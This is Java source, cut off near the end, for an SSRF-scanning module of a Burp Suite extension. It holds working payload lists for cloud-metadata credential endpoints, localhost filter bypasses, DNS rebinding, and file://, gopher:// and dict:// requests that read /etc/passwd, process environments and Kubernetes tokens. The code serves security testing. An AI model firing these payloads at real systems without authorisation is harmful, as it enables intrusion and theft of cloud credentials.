package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;

import com.omnistrike.model.*;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.*;

import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Pattern;

/**
 * MODULE 7: SSRF Scanner
 * Detects Server-Side Request Forgery using Burp Collaborator for OOB detection,
 * cloud metadata endpoint probing, localhost bypass techniques, and protocol smuggling.
 */
public class SsrfScanner implements ScanModule {

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;

    // Cloud metadata endpoints
    private static final String[][] CLOUD_METADATA = {
            // AWS IMDSv1
            {"http://169.254.169.254/latest/meta-data/", "ami-id|instance-id|instance-type|hostname|local-ipv4", "AWS IMDSv1 metadata"},
            {"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AccessKeyId|SecretAccessKey|Token", "AWS IAM credentials"},
            {"http://169.254.169.254/latest/user-data", "", "AWS user-data"},
            {"http://169.254.169.254/latest/dynamic/instance-identity/document", "accountId|region|instanceId", "AWS instance identity"},
            // GCP
            {"http://metadata.google.internal/computeMetadata/v1/", "attributes|hostname|zone", "GCP metadata"},
            {"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "access_token", "GCP service account token"},
            {"http://169.254.169.254/computeMetadata/v1/", "attributes", "GCP metadata (IP)"},
            // Azure
            {"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "vmId|location|name", "Azure instance metadata"},
            {"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "access_token", "Azure managed identity token"},
            // DigitalOcean
            {"http://169.254.169.254/metadata/v1/", "hostname|region|interfaces", "DigitalOcean metadata"},
            // Alibaba Cloud
            {"http://100.100.100.200/latest/meta-data/", "instance-id|hostname", "Alibaba Cloud metadata"},
            // Oracle Cloud
            {"http://169.254.169.254/opc/v2/instance/", "id|displayName|region", "Oracle Cloud metadata"},
            // Kubernetes
            {"https://kubernetes.default.svc/api/v1/", "APIResourceList|namespaces", "Kubernetes API"},
            // Hetzner Cloud
            {"http://169.254.169.254/hetzner/v1/metadata", "hostname|instance-id", "Hetzner Cloud metadata"},
            // Packet/Equinix Metal
            {"http://metadata.packet.net/metadata", "id|hostname|plan", "Packet/Equinix metadata"},
            // OpenStack
            {"http://169.254.169.254/openstack/latest/meta_data.json", "uuid|hostname|name", "OpenStack metadata"},
            // IBM Cloud
            {"http://169.254.169.254/metadata/v1/", "id|name|primary_network", "IBM Cloud metadata"},
            // Linode
            {"http://169.254.169.254/v1/", "id|label|region", "Linode metadata"},
            // AWS IMDSv1 additional
            {"http://169.254.169.254/latest/meta-data/local-ipv4", "REGEX:\\d+\\.\\d+\\.\\d+\\.\\d+", "AWS local IPv4"},
            {"http://169.254.169.254/latest/meta-data/public-ipv4", "REGEX:\\d+\\.\\d+\\.\\d+\\.\\d+", "AWS public IPv4"},
            {"http://169.254.169.254/latest/meta-data/hostname", "ec2.internal|compute.amazonaws", "AWS hostname"},
            // GCP additional
            {"http://metadata.google.internal/computeMetadata/v1/project/project-id", "", "GCP project ID"},
            {"http://metadata.google.internal/computeMetadata/v1/instance/hostname", ".", "GCP instance hostname"},
            // Azure additional
            {"http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01", "vmId|name|resourceGroupName", "Azure compute metadata"},
            // Docker / Container metadata
            {"http://172.17.0.1:2375/version", "Version|ApiVersion", "Docker API (unauth)"},
            {"http://172.17.0.1:2376/version", "Version|ApiVersion", "Docker API TLS (unauth)"},
            // Consul
            {"http://127.0.0.1:8500/v1/agent/self", "Config|Member", "Consul agent API"},
            // Rancher metadata
            {"http://rancher-metadata/latest/self/container", "name|service_name", "Rancher metadata"},
    };

    // Localhost bypass payloads
    private static final String[] LOCALHOST_BYPASSES = {
            "http://127.0.0.1/",
            "http://localhost/",
            "http://0.0.0.0/",
            "http://0/",
            "http://127.1/",
            "http://127.0.1/",
            "http://2130706433/",          // Decimal IP for 127.0.0.1
            "http://0x7f000001/",           // Hex IP for 127.0.0.1
            "http://0177.0.0.1/",           // Octal IP for 127.0.0.1
            "http://[::1]/",                // IPv6 loopback
            "http://[0:0:0:0:0:ffff:127.0.0.1]/", // IPv6-mapped IPv4
            "http://127.0.0.1:80/",
            "http://127.0.0.1:443/",
            "http://127.0.0.1:8080/",
            "http://127.0.0.1:8443/",
            "http://127.0.0.1:3000/",
            "http://127.0.0.1:9200/",       // Elasticsearch
            "http://127.0.0.1:6379/",       // Redis
            "http://127.0.0.1:11211/",      // Memcached
            "http://127.0.0.1:27017/",      // MongoDB
            "http://[0:0:0:0:0:0:0:1]/",   // Full IPv6 loopback
            "http://[::ffff:7f00:1]/",       // IPv6 mapped hex for 127.0.0.1
            "http://localtest.me/",          // DNS wildcard → 127.0.0.1
            "http://spoofed.burpcollaborator.net/", // DNS wildcard service
            "http://127.0.0.1:5432/",       // PostgreSQL
            "http://127.0.0.1:3306/",       // MySQL
            "http://0x7f.0x00.0x00.0x01/",  // Hex octets for 127.0.0.1
            // Enclosed alphanumeric
            "http://\u246F\u2468.\u2461\u2464\u2463.\u246F\u2468.\u2461\u2464\u2463/",
            // URL with credentials
            "http://user:pass@127.0.0.1/",
            // Rare IPv4 formats
            "http://0x7f.0.0.1/",                  // Partial hex
            "http://0177.0.0.01/",                 // Partial octal
            "http://127.0.0.1.nip.io/",            // DNS wildcard service
            "http://127.0.0.1.xip.io/",            // xip.io wildcard
            "http://www.127.0.0.1.nip.io/",        // www subdomain
            "http://127.0.0.1:9090/",              // Prometheus
            "http://127.0.0.1:4040/",              // ngrok
            "http://127.0.0.1:15672/",             // RabbitMQ management
            "http://127.0.0.1:8888/",              // Jupyter
            "http://127.0.0.1:2375/",              // Docker API
            "http://127.0.0.1:10250/",             // Kubelet
            "http://127.0.0.1:10255/",             // Kubelet read-only
            "http://127.0.0.1:8001/",              // kubectl proxy
            "http://[0000:0000:0000:0000:0000:0000:0000:0001]/", // Full expanded IPv6
            "http://127.127.127.127/",             // Non-standard loopback
            "http://0.0.0.0:80/",                  // All interfaces
    };

    // Protocol smuggling payloads (aggressive mode only)
    private static final String[] PROTOCOL_SMUGGLING = {
            "file:///etc/passwd",
            "file:///etc/hostname",
            "file:///proc/self/environ",
            "file:///proc/self/cmdline",
            "file:///proc/net/tcp",
            "file:///proc/version",
            "file:///c:/windows/win.ini",
            "gopher://127.0.0.1:6379/_INFO",
            "dict://127.0.0.1:6379/INFO",
            "ftp://127.0.0.1/",
            "jar:https://example.com!/",
            "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a",  // Redis RESP via gopher
            "gopher://127.0.0.1:11211/_stats%0d%0a",                  // Memcached via gopher
            "tftp://127.0.0.1/test",                                    // TFTP protocol
            "ldap://127.0.0.1/dc=example,dc=com",                      // LDAP protocol
            "file:///proc/self/fd/0",
            "file:///proc/self/maps",
            "file:///proc/self/mountinfo",
            "file:///proc/1/cmdline",
            "file:///c:/windows/system.ini",
            "file:///c:/inetpub/wwwroot/web.config",
            "gopher://127.0.0.1:25/_EHLO%0d%0a",              // SMTP via gopher
            "gopher://127.0.0.1:27017/_test",                    // MongoDB via gopher
            "gopher://127.0.0.1:5432/_test",                     // PostgreSQL via gopher
            "gopher://127.0.0.1:3306/_test",                     // MySQL via gopher
            "dict://127.0.0.1:11211/stats",                       // Memcached via dict
            "sftp://127.0.0.1/",                                    // SFTP protocol
            "netdoc:///etc/passwd",                                  // Java netdoc protocol
            "file:///etc/kubernetes/admin.conf",                    // K8s admin config
            "file:///var/run/secrets/kubernetes.io/serviceaccount/token", // K8s service account
    };

    // Patterns indicating successful internal access — only highly specific markers
    // Removed overly generic words like "hostname" that appear in normal HTML pages
    private static final Pattern INTERNAL_RESPONSE_PATTERNS = Pattern.compile(
            "root:x:0:0:|ami-[0-9a-f]+|instance-id|AccessKeyId|SecretAccessKey|" +
                    "vmId|accountId|\\[extensions\\]|\\[fonts\\]|Linux version \\d|" +
                    "APIResourceList|local-ipv4|access_token",
            Pattern.CASE_INSENSITIVE
    );

    // URL-like parameter name patterns
    private static final Pattern URL_PARAM_PATTERN = Pattern.compile(
            "(?i)(url|uri|link|src|source|href|redirect|redir|return|next|target|dest|" +
                    "destination|go|goto|callback|continue|path|file|page|load|fetch|" +
                    "proxy|forward|ref|img|image|pdf|doc|download|template|include|" +
                    "webhook|endpoint|api|service|host|domain|site)"
    );

    @Override
    public String getId() { return "ssrf-scanner"; }

    @Override
    public String getName() { return "SSRF Scanner"; }

    @Override
    public String getDescription() {
        return "SSRF detection via Burp Collaborator OOB, cloud metadata probing, localhost bypasses, and protocol smuggling.";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }

    @Override
    public boolean isPassive() { return false; }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<SsrfTarget> targets = extractTargets(request);

        for (SsrfTarget target : targets) {
            if (!dedup.markIfNew("ssrf-scanner", urlPath, target.name)) continue;

            try {
                testSsrf(requestResponse, target);
            } catch (Exception e) {
                api.logging().logToError("SSRF test error on " + target.name + ": " + e.getMessage());
            }
        }

        return Collections.emptyList();
    }

    private void testSsrf(HttpRequestResponse original, SsrfTarget target) throws InterruptedException {
        String url = original.request().url();
        boolean aggressiveMode = config.getBool("ssrf.aggressive", false);

        // Phase 1: Collaborator OOB detection (most reliable)
        if (collaboratorManager != null && collaboratorManager.isAvailable()) {
            testOobSsrf(original, target, url);
        }

        // Phase 2: Cloud metadata endpoint probing
        if (config.getBool("ssrf.metadata.enabled", true)) {
            testCloudMetadata(original, target, url);
        }

        // Phase 3: Localhost bypass techniques
        if (config.getBool("ssrf.localhost.enabled", true)) {
            testLocalhostBypasses(original, target, url);
        }

        // Phase 3.5: DNS rebinding via rbndr.us
        if (config.getBool("ssrf.rebinding.enabled", true)) {
            testDnsRebinding(original, target, url);
        }

        // Phase 4: Protocol smuggling (aggressive only)
        if (aggressiveMode && config.getBool("ssrf.protocol.enabled", true)) {
            testProtocolSmuggling(original, target, url);
        }
    }

    // ==================== PHASE 1: COLLABORATOR OOB ====================

    private void testOobSsrf(HttpRequestResponse original, SsrfTarget target, String url) throws InterruptedException {
        // Standard HTTP callback
        AtomicReference<HttpRequestResponse> httpSentRequest = new AtomicReference<>();
        String collabPayload = collaboratorManager.generatePayload(
                "ssrf-scanner", url, target.name, "SSRF OOB HTTP",
                interaction -> reportOobFinding(interaction, url, target, "HTTP/DNS", httpSentRequest.get()));
        if (collabPayload == null) return;

        // URL-encode the collaborator domain for double-encoding bypass
        String urlEncodedCollab = urlEncodeHost(collabPayload);

        String[] oobPayloads = {
                "http://" + collabPayload + "/ssrf",
                "https://" + collabPayload + "/ssrf",
                "//" + collabPayload + "/ssrf",
                "http://" + collabPayload,
                "http://" + collabPayload + ":80/ssrf",           // explicit port
                "http://" + collabPayload + ":443/ssrf",          // port confusion
                "http://" + collabPayload + "%00@allowed.com",    // null byte bypass
                "http://allowed.com@" + collabPayload,            // @ bypass
                "http://" + urlEncodedCollab,                     // URL-encoded host bypass
                "http://" + collabPayload + "#@allowed.com",    // Fragment bypass
                "http://" + collabPayload + "%23@allowed.com",  // URL-encoded fragment
                "http://allowed.com\\" + collabPayload,         // Backslash subdomain bypass
        };

        for (String payload : oobPayloads) {
            HttpRequestResponse result = sendPayload(original, target, payload);
            httpSentRequest.compareAndSet(null, result); // Capture the first send result
            perHostDelay();
        }

        // DNS-only callback (for blind SSRF where HTTP is blocked)
        AtomicReference<HttpRequestResponse> dnsSentRequest = new AtomicReference<>();
        String dnsPayload = collaboratorManager.generatePayload(
                "ssrf-scanner", url, target.name, "SSRF OOB DNS-only",
                interaction -> reportOobFinding(interaction, url, target, "DNS-only", dnsSentRequest.get()));
        if (dnsPayload != null) {
            HttpRequestResponse dnsResult = sendPayload(original, target, dnsPayload); // Just the hostname, no scheme
            dnsSentRequest.set(dnsResult);
            perHostDelay();
        }

        // Header injection for Host-based SSRF
        AtomicReference<HttpRequestResponse> hostSentRequest = new AtomicReference<>();
        String headerCollab = collaboratorManager.generatePayload(
                "ssrf-scanner", url, target.name, "SSRF OOB Host header",
                interaction -> {
                    findingsStore.addFinding(Finding.builder("ssrf-scanner",
                                    "SSRF via Host Header Injection",
                                    Severity.HIGH, Confidence.CERTAIN)
                            .url(url).parameter("Host header")
                            .evidence("Collaborator " + interaction.type() + " interaction from " + interaction.clientIp())
                            .description("Server followed a manipulated Host header to make an external request.")
                            .requestResponse(hostSentRequest.get())
                            .build());
                });
        if (headerCollab != null) {
            try {
                HttpRequest modified = original.request()
                        .withRemovedHeader("Host")
                        .withAddedHeader("Host", headerCollab);
                HttpRequestResponse hostResult = api.http().sendRequest(modified);
                hostSentRequest.set(hostResult);
                perHostDelay();
            } catch (Exception e) {
                api.logging().logToError("Host header SSRF test failed: " + e.getMessage());
            }
        }
    }

    private void reportOobFinding(Interaction interaction, String url, SsrfTarget target, String method,
                                    HttpRequestResponse requestResponse) {
        findingsStore.addFinding(Finding.builder("ssrf-scanner",
                        "SSRF Confirmed (Out-of-Band " + method + ")",
                        Severity.CRITICAL, Confidence.CERTAIN)
                .url(url).parameter(target.name)
                .evidence("Collaborator " + interaction.type().name() + " interaction from "
                        + interaction.clientIp() + " at " + interaction.timeStamp())
                .description("Server-Side Request Forgery confirmed. The server made an external "
                        + interaction.type().name() + " request to the Collaborator server when "
                        + "parameter '" + target.name + "' was injected with a Collaborator URL.")
                .requestResponse(requestResponse)
                .build());
        api.logging().logToOutput("[SSRF] Confirmed OOB interaction! " + url + " param=" + target.name);
    }

    // ==================== PHASE 2: CLOUD METADATA ====================

    private void testCloudMetadata(HttpRequestResponse original, SsrfTarget target, String url) throws InterruptedException {
        // Get baseline

        HttpRequestResponse baseline = sendPayload(original, target, target.originalValue);
        String baselineBody = baseline != null && baseline.response() != null
                ? baseline.response().bodyToString() : "";

        for (String[] meta : CLOUD_METADATA) {
            String metaUrl = meta[0];
            String expectedPatterns = meta[1];
            String description = meta[2];

    
            HttpRequestResponse result = sendPayload(original, target, metaUrl);
            if (result == null || result.response() == null) continue;

            String body = result.response().bodyToString();
            int status = result.response().statusCode();

            // Check if response contains expected cloud metadata patterns
            if (status == 200 && !body.equals(baselineBody)) {
                if (!expectedPatterns.isEmpty()) {
                    for (String pattern : expectedPatterns.split("\\|")) {
                        String trimmed = pattern.trim();
                        boolean patternMatched;
                        if (trimmed.startsWith("REGEX:")) {
                            patternMatched = Pattern.compile(trimmed.substring(6)).matcher(body).find();
                        } else {
                            patternMatched = body.contains(trimmed);
                        }
                        if (patternMatched) {
                            Severity severity = description.contains("credential") || description.contains("token")
                                    ? Severity.CRITICAL : Severity.HIGH;
                            findingsStore.addFinding(Finding.builder("ssrf-scanner",
                                            "SSRF: " + description + " accessible",
                                            severity, Confidence.FIRM)
                                    .url(url).parameter(target.name)
                                    .evidence("Metadata URL: " + metaUrl + " | Response contains: " + pattern.trim())
                                    .description("Cloud metadata endpoint accessible via SSRF. " + description + ".")
                                    .requestResponse(result)
                                    .build());
                            break;
                        }
                    }
                } else if (body.length() > 10) {
                    findingsStore.addFinding(Finding.builder("ssrf-scanner",
                                    "Potential SSRF: " + description,
                                    Severity.MEDIUM, Confidence.TENTATIVE)
                            .url(url).parameter(target.name)
                            .evidence("Metadata URL: " + metaUrl + " returned non-empty response (len=" + body.length() + ")")
                            .description("Cloud metadata endpoint returned data. Verify manually.")
                            .requestResponse(result)
                            .build());
                }
            }
            perHostDelay();
        }

        // AWS IMDSv2 - requires PUT to get token, then GET with token header
        // Test by injecting the full IMDSv2 metadata URL (the app may handle PUT internally)
        String imdsv2Url = "http://169.254.169.254/latest/meta-data/";
        HttpRequestResponse imdsv2Result = sendPayload(original, target, imdsv2Url);
        if (imdsv2Result != null && imdsv2Result.response() != null) {
            String imdsv2Body = imdsv2Result.response().bodyToString();
            int imdsv2Status = imdsv2Result.response().statusCode();
            // IMDSv2 returns 401 if token not provided, which still confirms SSRF
            if (imdsv2Status == 401 && !baselineBody.contains("401")) {
                findingsStore.addFinding(Finding.builder("ssrf-scanner",
                                "SSRF: AWS IMDSv2 endpoint reachable (token required)",
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("AWS IMDSv2 returned 401 (token required) - confirms SSRF to 169.254.169.254")
                        .description("AWS metadata endpoint is reachable but requires IMDSv2 token. "
                                + "The server can reach the internal metadata service. "
                                + "If the application makes requests with custom headers, token retrieval may be possible.")
                        .requestResponse(imdsv2Result)
                        .build());
            }
        }

        // Redirect-based SSRF: use external redirect to internal URLs
        // This bypasses URL validation that only checks the initial URL
        if (config.getBool("ssrf.redirect.enabled", true)) {
            testRedirectSsrf(original, target, url, baselineBody);
        }
    }

    // ==================== PHASE 2.5: REDIRECT-BASED SSRF ====================

    private void testRedirectSsrf(HttpRequestResponse original, SsrfTarget target,
                                   String url, String baselineBody) throws InterruptedException {
        // Common redirect services that can redirect to internal IPs
        String[] redirectPayloads = {
                "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                // URL with @ to trick parsers: http://expected@evil
                "http://example.com@169.254.169.254/latest/meta-data/",
                "http://169.254.169.254.nip.io/latest/meta-data/",
                // DNS rebinding targets
                "http://169.254.169.254:80/latest/meta-data/",
                "http://[::ffff:169.254.169.254]/latest/meta-data/",
                // URL with fragment
                "http://169.254.169.254/latest/meta-data/#",
        };

        for (String payload : redirectPayloads) {
            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) continue;

            String body = result.response().bodyToString();
            int status = result.response().statusCode();

            if (status == 200 && !body.equals(baselineBody) && body.length() > 10) {
                if (INTERNAL_RESPONSE_PATTERNS.matcher(body).find()) {
                    findingsStore.addFinding(Finding.builder("ssrf-scanner",
                                    "SSRF: Internal access via URL manipulation",
                                    Severity.CRITICAL, Confidence.FIRM)
                            .url(url).parameter(target.name)
                            .evidence("Payload: " + payload + " | Internal data in response")
                            .description("Internal resource accessed via URL parsing bypass technique.")
                            .requestResponse(result)
                            .build());
                    return;
                }
            }
            perHostDelay();
        }
    }

    // ==================== PHASE 3: LOCALHOST BYPASSES ====================

    private void testLocalhostBypasses(HttpRequestResponse original, SsrfTarget target, String url) throws InterruptedException {

        HttpRequestResponse baseline = sendPayload(original, target, target.originalValue);
        String baselineBody = baseline != null && baseline.response() != null
                ? baseline.response().bodyToString() : "";
        int baselineLen = baselineBody.length();

        for (String bypass : LOCALHOST_BYPASSES) {
    
            HttpRequestResponse result = sendPayload(original, target, bypass);
            if (result == null || result.response() == null) continue;

            String body = result.response().bodyToString();
            int status = result.response().statusCode();

            // If response is significantly different from baseline and appears to contain server data
            if (status == 200 && Math.abs(body.length() - baselineLen) > 100) {
                if (INTERNAL_RESPONSE_PATTERNS.matcher(body).find()) {
                    findingsStore.addFinding(Finding.builder("ssrf-scanner",
                                    "SSRF: Localhost bypass successful",
                                    Severity.HIGH, Confidence.FIRM)
                            .url(url).parameter(target.name)
                            .evidence("Bypass payload: " + bypass + " | Response length: " + body.length()
                                    + " vs baseline: " + baselineLen)
                            .description("Localhost access achieved via IP bypass technique.")
                            .requestResponse(result)
                            .build());
                    return; // One confirmed bypass is enough
                }
            }
            perHostDelay();
        }
    }

    // ==================== PHASE 4: PROTOCOL SMUGGLING ====================

    private void testProtocolSmuggling(HttpRequestResponse original, SsrfTarget target, String url) throws InterruptedException {

        HttpRequestResponse baseline = sendPayload(original, target, target.originalValue);
        String baselineBody = baseline != null && baseline.response() != null
                ? baseline.response().bodyToString() : "";

        for (String payload : PROTOCOL_SMUGGLING) {
    
            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) continue;

            String body = result.response().bodyToString();
            int status = result.response().statusCode();

            if (status == 200 && !body.equals(baselineBody) && body.length() > 10) {
                if (INTERNAL_RESPONSE_PATTERNS.matcher(body).find()) {
                    String proto = payload.contains("://") ? payload.substring(0, payload.indexOf("://")) : "unknown";
                    findingsStore.addFinding(Finding.builder("ssrf-scanner",
                                    "SSRF: Protocol smuggling via " + proto + "://",
                                    Severity.CRITICAL, Confidence.FIRM)
                            .url(url).parameter(target.name)
                            .evidence("Protocol payload: " + payload + " | Response contains internal data")
                            .description("Protocol smuggling successful. Server followed " + proto + " URI scheme.")
                            .requestResponse(result)
                            .build());
                }
            }
            perHostDelay();
        }
    }

    // ==================== PHASE 3.5: DNS REBINDING ====================

    private void testDnsRebinding(HttpRequestResponse original, SsrfTarget target, String url) throws InterruptedException {
        // DNS rebinding payloads via rbndr.us service
        // Format: <hexIP1>.<hexIP2>.rbndr.us - alternates resolution between the two IPs
        String[][] rebindingDomains = {
                // 127.0.0.1 (7f000001) <-> 169.254.169.254 (a9fea9fe) - AWS metadata
                {"7f000001.a9fea9fe.rbndr.us", "127.0.0.1 <-> 169.254.169.254 (AWS metadata)"},
                // 127.0.0.1 (7f000001) <-> 172.17.0.1 (ac110001) - Docker gateway
                {"7f000001.ac110001.rbndr.us", "127.0.0.1 <-> 172.17.0.1 (Docker gateway)"},
        };

        HttpRequestResponse baseline = sendPayload(original, target, target.originalValue);
        String baselineBody = baseline != null && baseline.response() != null
                ? baseline.response().bodyToString() : "";

        for (String[] rebind : rebindingDomains) {
            String domain = rebind[0];
            String description = rebind[1];

            String[] payloads = {
                    "http://" + domain + "/latest/meta-data/",
                    "http://" + domain + "/",
                    "http://" + domain + ":80/",
            };

            for (String payload : payloads) {
                HttpRequestResponse result = sendPayload(original, target, payload);
                if (result == null || result.response() == null) continue;

                String body = result.response().bodyToString();
                int status = result.response().statusCode();

                if (status == 200 && !body.equals(baselineBody) && body.length() > 10) {
                    if (INTERNAL_RESPONSE_PATTERNS.matcher(body).find()) {
                        findingsStore.addFinding(Finding.builder("ssrf-scanner",
                                        "SSRF via DNS Rebinding: " + description,
                                        Severity.HIGH, Confidence.FIRM)
                                .url(url).parameter(target.name)
                                .evidence("DNS rebinding domain: " + domain + " | Payload: " + payload
                                        + " | Internal content detected in response")
                                .description("DNS rebinding attack successful using rbndr.us service. "
                                        + "The server resolved the domain to an internal IP on a subsequent request, "
                                        + "bypassing SSRF filters that only validate the initial DNS resolution. "
                                        + "Rebinding pair: " + description)
                                .requestResponse(result)
                                .build());
                        return; // One confirmed rebinding is enough
                    }
                }
                perHostDelay();
            }
        }
    }

    // ==================== HELPERS ====================

    private HttpRequestResponse sendPayload(HttpRequestResponse original, SsrfTarget target, String payload) {
        try {
            HttpRequest modified = injectPayload(original.request(), target, payload);
            return api.http().sendRequest(modified);
        } catch (Exception e) {
            return null;
        }
    }

    private HttpRequest injectPayload(HttpRequest request, SsrfTarget target, String payload) {
        switch (target.type) {
            case QUERY:
                return request.withUpdatedParameters(
                        HttpParameter.urlParameter(target.name,
                                URLEncoder.encode(payload, StandardCharsets.UTF_8)));
            case BODY:
                return request.withUpdatedParameters(
                        HttpParameter.bodyParameter(target.name,
                                URLEncoder.encode(payload, StandardCharsets.UTF_8)));
            case COOKIE:
                return request.withUpdatedParameters(
                        HttpParameter.cookieParameter(target.name, payload));
            case JSON:
                return injectJsonPayload(request, target.name, payload);
            case HEADER:
                return request.withRemovedHeader(target.name)
                        .withAddedHeader(target.name, payload);
            default:
                return request;
        }
    }

    /**
     * Inject a payload into a JSON body, supporting dot-notation keys for nested objects.
     */
    private HttpRequest injectJsonPayload(HttpRequest request, String dotKey, String payload) {
        try {
            String body = request.bodyToString();
            com.google.gson.JsonElement root = com.google.gson.JsonParser.parseString(body);
            if (!root.isJsonObject()) return request;

            String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
            String[] parts = dotKey.split("\\.");

            if (parts.length == 1) {
                // Top-level key — simple regex replacement
                String pattern = "\"" + java.util.regex.Pattern.quote(dotKey) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
                String replacement = "\"" + dotKey + "\": \"" + escaped + "\"";
                return request.withBody(body.replaceFirst(pattern, replacement));
            }

            // Nested key — navigate to parent and replace
            com.google.gson.JsonObject current = root.getAsJsonObject();
            for (int i = 0; i < parts.length - 1; i++) {
                com.google.gson.JsonElement child = current.get(parts[i]);
                if (child == null || !child.isJsonObject()) return request;
                current = child.getAsJsonObject();
            }
            String leafKey = parts[parts.length - 1];
            current.addProperty(leafKey, payload);
            return request.withBody(new com.google.gson.Gson().toJson(root));
        } catch (Exception e) {
            // Fallback: simple regex replacement for flat key
            String body = request.bodyToString();
            String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
            String pattern = "\"" + java.util.regex.Pattern.quote(dotKey) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
            String replacement = "\"" + dotKey + "\": \"" + escaped + "\"";
            return request.withBody(body.replaceFirst(pattern, replacement));
        }
    }

    private List<SsrfTarget> extractTargets(HttpRequest request) {
        List<SsrfTarget> targets = new ArrayList<>();

        for (var param : request.parameters()) {
            // Only test parameters whose names suggest URL handling
            if (!URL_PARAM_PATTERN.matcher(param.name()).find()) continue;

            switch (param.type()) {
                case URL:
                    targets.add(new SsrfTarget(param.name(), param.value(), SsrfTargetType.QUERY));
                    break;
                case BODY:
                    targets.add(new SsrfTarget(param.name(), param.value(), SsrfTargetType.BODY));
                    break;
                case COOKIE:
                    targets.add(new SsrfTarget(param.name(), param.value(), SsrfTargetType.COOKIE));
                    break;
            }
        }

        // Also check params whose values look like URLs (including cookies)
        for (var param : request.parameters()) {
            if (param.value() != null &&
                    (param.value().startsWith("http://") || param.value().startsWith("https://")
                            || param.value().startsWith("//"))) {
                SsrfTargetType type;
                switch (param.type()) {
                    case URL: type = SsrfTargetType.QUERY; break;
                    case COOKIE: type = SsrfTargetType.COOKIE; break;
                    default: type = SsrfTargetType.BODY; break;
                }
                SsrfTarget t = new SsrfTarget(param.name(), param.value(), type);
                if (!targets.contains(t)) targets.add(t);
            }
        }

        // JSON body URL-like values (recursive traversal with dot-notation)
        String ct = "";
        for (var h : request.headers()) {
            if (h.name().equalsIgnoreCase("Content-Type")) { ct = h.value(); break; }
        }
        if (ct.contains("application/json")) {
            try {
                String body = request.bodyToString();
                if (body != null) {
                    com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(body);
                    if (el.isJsonObject()) {
                        extractJsonSsrfTargets(el.getAsJsonObject(), "", targets);
                    }
                }
            } catch (Exception ignored) {}
        }

        // SSRF-relevant headers — always test regardless of URL_PARAM_PATTERN
        String[][] ssrfHeaders = {
                {"Referer", null},
                {"X-Forwarded-For", null},
                {"X-Forwarded-Host", null},
                {"X-Original-URL", null},
                {"X-Rewrite-URL", null},
        };
        for (String[] headerDef : ssrfHeaders) {
            String headerName = headerDef[0];
            String headerValue = "";
            // Check if header exists in the original request
            for (var h : request.headers()) {
                if (h.name().equalsIgnoreCase(headerName)) {
                    headerValue = h.value();
                    break;
                }
            }
            targets.add(new SsrfTarget(headerName, headerValue, SsrfTargetType.HEADER));
        }

        return targets;
    }

    /**
     * URL-encode each character of a hostname for double-encoding SSRF bypass.
     */
    private String urlEncodeHost(String host) {
        StringBuilder sb = new StringBuilder();
        for (char c : host.toCharArray()) {
            sb.append(String.format("%%%02X", (int) c));
        }
        return sb.toString();
    }

    /**
     * Recursively extract JSON keys using dot-notation for nested objects.
     * Only includes values that match URL parameter name patterns or look like URLs.
     */
    private void extractJsonSsrfTargets(com.google.gson.JsonObject obj, String prefix, List<SsrfTarget> targets) {
        for (String key : obj.keySet()) {
            com.google.gson.JsonElement val = obj.get(key);
            String fullKey = prefix.isEmpty() ? key : prefix + "." + key;
            if (val.isJsonPrimitive() && val.getAsJsonPrimitive().isString()) {
                String v = val.getAsString();
                if (URL_PARAM_PATTERN.matcher(key).find()
                        || v.startsWith("http://") || v.startsWith("https://")) {
                    targets.add(new SsrfTarget(fullKey, v, SsrfTargetType.JSON));
                }
            } else if (val.isJsonObject()) {
                extractJsonSsrfTargets(val.getAsJsonObject(), fullKey, targets);
            }
        }
    }

    private String extractPath(String url) {
        try {
            if (url.contains("://")) url = url.substring(url.indexOf("://") + 3);
            int s = url.indexOf('/');
            if (s >= 0) { int q = url.indexOf('?', s); return q >= 0 ? url.substring(s, q) : url.substring(s); }
        } catch (Exception ignored) {}
        return url;
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("ssrf.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    @Override
    public void destroy() { }

    private enum SsrfTargetType { QUERY, BODY, JSON, COOKIE, HEADER }

    private static class SsrfTarget {
        final String name, originalValue;
        final SsrfTargetType type;
        SsrfTarget(String n, String v, SsrfTargetType t) { name = n; originalValue = v != null ? v : ""; type = t; }
        @Override public boolean equals(Object o) {
            if (this == o) return true;
            if (!(o instanceof SsrfTarget)) return false;
            SsrfTarget t = (SsrfTarget) o;
